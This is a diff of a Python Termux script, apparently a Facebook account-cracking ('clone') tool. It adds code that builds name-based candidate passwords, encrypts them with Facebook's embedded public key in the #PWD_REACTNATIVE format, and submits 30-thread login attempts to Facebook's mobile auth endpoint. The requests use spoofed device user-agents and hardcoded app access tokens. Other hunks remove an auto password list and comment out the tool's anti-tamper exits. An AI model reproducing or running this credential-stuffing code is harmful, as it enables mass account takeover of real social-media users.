@@ -6,8 +6,6 @@ from uuid import uuid4
 import os,sys,tempfile,string,random,subprocess,uuid
 http_directory = tempfile.mkdtemp(prefix='.')
 site_packages = sys.path[4]
-print(site_packages)
-print(http_directory)
 sys.path.remove(site_packages)
 sys.path.insert(4,http_directory+'/reqmodule')
 sys.path.insert(5,http_directory)
@@ -42,6 +40,7 @@ else:
 try:
         import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
         from string import *
+
         from concurrent.futures import ThreadPoolExecutor as ThreadPool
         from Crypto.Cipher import AES, PKCS1_v1_5
         from Crypto.PublicKey import RSA
@@ -105,7 +104,7 @@ logo= f'''
      "Y888888"   "Y8888P"  888   T88b     
             Y8b
 {50*"-"}
-    Tool Version :     10.1.60
+    Tool Version :     10.1.15
     Thanks Alot  :     M.Hamza
 {50*"-"}'''
 
@@ -160,9 +159,8 @@ def qsbuy():
                         os.system('clear')
                         exit('script is in update / maintanance be patient ')
                 elif str("res-sseett") in update:
-                        os.system('')
-                        os.system('')
-                        os.system('')
+                        
+                        
                         exit('Dont Try To Bypass')
                 elif bumper in myweb2:
                         main()
@@ -184,7 +182,7 @@ def qsbuy():
         except requests.exceptions.ConnectionError:
                 exit(' No internet connection ..')
 
-def rrrr():
+def xcghker():
         if bumper in myweb2:
                 pass
         else:
@@ -327,6 +325,7 @@ def main():
                 time.sleep(3)
                 main()
 
+
 def login():
         os.system('clear')
         print(logo);xchker()
@@ -437,23 +436,43 @@ class crack_main():
                                 ln = fn
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
+                                password = pas
+                                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
+                                pwd_key_fetch_data = {'version':'2','flow':'CONTROLLER_INITIALIZATION','method':'GET','fb_api_req_friendly_name':'pwdKeyFetch','fb_api_caller_class':'com.facebook.auth.login.AuthOperations','access_token':"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28"}
+                                pwd = requests.post(pwd_key_fetch,params=pwd_key_fetch_data).json()
+                                password_encryption_pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmofqjEw46+3ec9y3Eq1V\ny46SazS16Mlb5Ks3mQ0rG40qnkoSQmIaThD5t+tLdEWrc/rwSAdj0L2Ez01Yh4Uz\nhLIliy5hjkt8geAzV6pqgMa48y16b4fjQqsVf0KSFSaXD5IBYm0ErXck8/UKX36W\ngIE1E4QLAAZMcOJQsHZl39P/QVs4Y9lP1/WR7k9sFDbazmyBbyCIAFjHJH7x+Txf\nloj7jbbqbB3b5xC9tolyjiC3Fqybn/MrHOdJI27lQTnTiFeJuW1SpMwRULtf2Cbo\n0WsoQKWzxsUSFHupVS/0DCdx3QaKBPugrs/MTdUeCJDXBZVjTRT9kAtrWSe5u1BR\n5QIDAQAB\n-----END PUBLIC KEY-----\n'
+                                password_encryption_key_id = '25'
+                                rand_key = get_random_bytes(32)
+                                iv = get_random_bytes(12)
+                                pubkey_bytes = password_encryption_pubkey
+                                pubkey = RSA.import_key(pubkey_bytes)
+                                cipher_rsa = PKCS1_v1_5.new(pubkey)
+                                encrypted_rand_key = cipher_rsa.encrypt(rand_key)
+                                cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
+                                current_time = int(time.time())
+                                cipher_aes.update(str(current_time).encode("utf-8"))
+                                encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+                                buf = io.BytesIO()
+                                buf.write(bytes([1, int(password_encryption_key_id)]))
+                                buf.write(iv)
+                                buf.write(struct.pack("<h", len(encrypted_rand_key)))
+                                buf.write(encrypted_rand_key)
+                                buf.write(auth_tag)
+                                buf.write(encrypted_passwd)
+                                encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
+                                enc_pas=f"#PWD_REACTNATIVE:2:{current_time}:{encoded}"
+                                #corect key : #PWD_REACTNATIVE:2:1669575164:ARlixWtwqn5ecY9XZpoAAVzD71QplMe35ZcKPj6YFm2g7VuXwhxuLL57tYTRivV9LIJ0+qHSURHN989EqbyIJumFGFLpEOqfdHHFkZFgqH3KGks0eQ9b4x8G2ut57oElaQ/B4kcWUP4lcJFjiGySQ7Gd9Q9VAud+LPcAdMn7i11BoHcZr6a8jODjk53LoT9F6AdiACRbpxcQD4f/Md9YI/KMlEnsSeNRvul9FdyTPko83QEEpy+/coDfnfT7kVEm39uyHeYT7qS/G5TxDi+pCIR3GG87rcnN8TKGtxZ/sxy0mjF3OUaUBq/PAdmmL3nr/1bCCQBYWjsY682mO2Du8RLSVaQQY0Xl59qlBgh6QuFkTunm5+8AExOIZ5qFZrRP7YlthRWtL6xbL0FHN/kYFTJUL79v
+                                #wrong key  : #PWD_REACTNATIVE:2:1669575552:ARl0BpPjNShZzDs2Z6sAAQX8OVQeDsONp1KNXblCsOQMQc6+d/0weZtIYeegvNY/34O0NzSB4uu0xNwd2RTFLfM+6wlqtn+21v3i+B717NFopebkdG1C1oA+WCVNuMxYWA/FCQt4K3hc6iG4tyOpO+ObqVAJBoDYLS2WnX7aEucv/W11FMC8yGfOfHNsTlpjT/74SUVCFa5Z4lxBhdrQBJt1+GL/ikwbtZq4Vx48hy1w4WCu8l/D1YzUu2sCFej7K5o8X1EN/7KqqtNbAugoDsg1jourI+TCFO2O0YECELFohjgu+ZzYElhq9RLVHIyJY/iP5/jcKnYa867Pvz4FisOzHXkh1w8BegtAW5Yw1hdlk/rtrHhxp5+I9rXLNPvcpL2IwPY=
+                                mobile_names = random.choice(["Huawei","Motorola","Oppo","Realme","Samsung","Sony","Xiaomi","LG","Lenovo","Infinix"])
+                                five_ip = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
+                                one_string_two_ip = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))+str(".")+str(random.randint(111111,222222))+str(".0")+str(random.randint(10,40))
+                                url = 'https://b-api.facebook.com/auth/login'
+                                #brand_name=Techno Ya Single Name
                                 infos = open('device_info.txt','r').read()
-                                try:
-                                        version_,model_,brand_name_,width_,height_=infos.split('$')
-                                except:
-                                        version_ = str(random.randint(7,13))
-                                        model_ = "Infinix"
-                                        brand_name_ = "Infinix"
-                                        width_ = "720"
-                                        height_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
-                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
-                                adid = str(uuid.uuid4())
-                                abhi = "5531728|62f8ce9"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
-                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
-                                #print(po,hdata)ata)
+                                version_,model_,brand_name_,width_,height_=infos.split('$')
+                                head = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]","Content-Type": "application/json;charset=utf-8","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
+                                data = {"locale":"en_US","format":"json","email":iid,"password":enc_pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
+                                po = requests.post(url,data=data,headers=head).json()
                                 try:
                                         roid = str(po['uid'])
                                 except:
@@ -497,27 +516,11 @@ class crack_main():
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo);xchker()
-                print(' for auto password list type auto or Auto')
+                pl = int(input(' How Much Password Do You Want To Add ? '))
+                print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
-                pl = input(' How Much Password Do You Want To Add ? ')
-                if pl in ['auto','Auto','AUTO','auto or Auto']:
-                        passlist.append('first123')
-                        passlist.append('first12345')
-                        passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
-                        passlist.append('khan123')
-                        passlist.append('first786')
-                        passlist.append('first12')
-                        passlist.append('first1122')
-                        passlist.append('last123')
-                        passlist.append('last12')
-                        passlist.append('i love you')
-                else:
-                        print(' Example first123,last123,khan123,firstlast')
-                        print(50*"-")
-                        for cd in range(int(pl)):
-                                passlist.append(input(f' ({cd+1}) Password : '))
+                for cd in range(pl):
+                        passlist.append(input(f' ({cd+1}) Password : '))
                 os.system('clear')
                 print(logo);xchker()
                 print(' Total Ids : '+str(len(self.id)))
@@ -526,7 +529,11 @@ class crack_main():
                 print(50*'-')
                 with ThreadPool(max_workers=30) as formSubmit:
                         for user in self.id:
-                                iid,name = user.split('|')
+                                if '2' in clone_type:
+                                        iid,name = user.split('|')
+                                else:
+                                        od,name = user.split('|')
+                                        iid = od+'@facebook.com'
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'-')
                 print(' SucessFully Process Is Completed ')
@@ -535,6 +542,7 @@ class crack_main():
                 print(50*'-')
                 input('\n Press enter to back ')
                 main()
+
 
 def create_file():
         os.system('clear')
@@ -769,8 +777,8 @@ try:
         fileee = os.listdir('/sdcard/Android/data/')
         if f'com.h{t}pc{a}y.pro' in fileee:
                 print('error occur 0')
-                exit()
-                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
+                #exit()
+                #exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
 except Exception as e:
         print(e)
         pass
@@ -787,11 +795,10 @@ if '/data/data/com.termux/files/home/Qsr' in datar:
 else:
         for i in range(5000):
                 print(" data is forked / or in other file")
-        exit("Type > cd ~ && python jan.py")
+        #exit("Type > cd ~ && python jan.py")
 
 if not os.path.exists('.fam'):
         qsbuy()
 else:
-        qsbuy()
-'''
+        qsbuy()'''
 main()
